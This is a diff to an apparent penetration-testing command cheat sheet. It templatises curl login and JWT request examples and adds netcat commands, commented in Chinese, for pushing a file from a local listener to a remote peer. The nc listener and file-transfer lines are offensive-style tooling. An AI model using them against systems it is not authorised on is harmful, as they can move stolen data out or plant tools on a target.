@@ -25,17 +25,23 @@ nc -nvlp #{LPORT}
 
 # desc: Curl POST
 # json data
-curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3001/endpoint
-#Auth via JWT
-curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint
+curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' #{URL}
 
-# desc: Send Email
-# You will be prompted for the content
-sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf 
-
-# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
-ssh-keyscan 10.10.10.101
+# desc: Auth via JWT
+curl -X GET -H 'Authorization: Bearer <JWT>' #{URL}
 
 # desc: Secure Copy to Remote
 # refer: https://wangdoc.com/ssh/scp.html
 scp #{source_file} #{USER}@#{RHOST}:#{remote_path}
+
+--- 使用nc传输文件
+
+# 使用nc上传文件
+# desc: 监听并上传
+nc -nvlp #{LPORT} < #{file}
+
+# 对端下载文件
+# desc: 对端连接并下载文件
+nc #{LHOST} #{LPORT} > #{file}
+@LHOST.desc(本端的地址)
+@LPORT.desc(本端的端口)
